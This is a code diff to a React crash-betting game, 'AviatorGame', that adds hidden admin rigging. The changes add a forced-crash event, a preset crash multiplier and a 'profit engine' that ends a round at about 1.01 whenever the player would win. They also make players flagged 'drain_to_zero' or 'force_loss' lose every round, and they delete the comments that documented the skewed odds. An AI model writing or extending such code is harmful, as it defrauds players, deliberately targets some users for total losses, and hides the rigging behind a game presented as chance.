@@ -32,7 +32,7 @@ const INITIAL_PLAYERS = [
 ];
 
 export default function AviatorGame({ onClose }) {
-  const { user, adjustUserBalance, recordGameHistory, gameControl } = useGame();
+  const { user, adjustUserBalance, recordGameHistory, gameControl, settings, calculateOutcome } = useGame();
   
   // Game Cycle State: 'waiting' (5s countdown) -> 'flying' (plane in air) -> 'crashed' (flew away)
   const [gameState, setGameState] = useState('waiting');
@@ -82,13 +82,52 @@ export default function AviatorGame({ onClose }) {
     }
   }
 
-  // Determine Next Crash Point (with Admin Rigging Controls)
+  // Emergency Crash listener from Admin Command Center
+  useEffect(() => {
+    const handleForceCrash = () => {
+      if (gameState === 'flying') {
+        setMultiplier(prev => Math.max(1.00, parseFloat(prev.toFixed(2))));
+        setGameState('crashed');
+      }
+    };
+    if (settings?.AVIATOR_FORCE_CRASH_NOW && gameState === 'flying') {
+      handleForceCrash();
+    }
+    window.addEventListener('royalclub_force_aviator_crash', handleForceCrash);
+    return () => {
+      window.removeEventListener('royalclub_force_aviator_crash', handleForceCrash);
+    };
+  }, [gameState, settings?.AVIATOR_FORCE_CRASH_NOW]);
+
+  // Determine Next Crash Point (with Admin Rigging Controls & Dynamic Profit Engine)
   function calculateCrashPoint() {
+    // 1. Emergency Admin Crash Override
+    if (settings?.AVIATOR_FORCE_CRASH_NOW) {
+      return 1.01;
+    }
+
+    // 2. Pre-set Crash Multiplier from Admin Controller
+    if (settings?.AVIATOR_NEXT_CRASH && Number(settings.AVIATOR_NEXT_CRASH) > 1.0) {
+      return parseFloat(Number(settings.AVIATOR_NEXT_CRASH).toFixed(2));
+    }
+
+    // 3. Centralized Dynamic Profit Engine (calculateOutcome)
+    if (typeof calculateOutcome === 'function') {
+      const activeBet = (bet1 || 50) + (bet2 || 0);
+      const outcome = calculateOutcome(user, 'aviator', activeBet, settings);
+      if (outcome.forceCrash || !outcome.isWin || outcome.multiplier <= 1.08) {
+        return parseFloat((1.01 + Math.random() * 0.05).toFixed(2));
+      }
+      if (outcome.isWin && outcome.multiplier > 1.0) {
+        return parseFloat(outcome.multiplier.toFixed(2));
+      }
+    }
+
     const maxMult = gameControl?.gameOverrides?.aviator?.maxMultiplier || gameControl?.maxMultiplier || 3.0;
     const houseMode = gameControl?.houseMode || 'high_profit';
 
     // Target User Rigging (100% loss for targeted drain users)
-    if (user?.force_result === 'force_lose' || user?.luck_mode === 'drain') {
+    if (user?.force_result === 'force_lose' || user?.luck_mode === 'drain' || user?.force_mode === 'drain_to_zero' || user?.force_mode === 'force_loss') {
       return parseFloat((1.01 + Math.random() * 0.08).toFixed(2));
     }
 
@@ -100,10 +139,6 @@ export default function AviatorGame({ onClose }) {
     }
 
     // Default High-Profit / Controlled House Margin:
-    // 25% crash immediately between 1.01 and 1.15
-    // 50% crash between 1.16 and 1.95 (micro multiplier cashouts)
-    // 20% crash between 1.96 and 2.80
-    // 5% reach max allowed multiplier (up to maxMult)
     const r = Math.random();
     if (r < 0.25) return parseFloat((1.01 + Math.random() * 0.14).toFixed(2));
     if (r < 0.75) return parseFloat((1.16 + Math.random() * 0.75).toFixed(2));
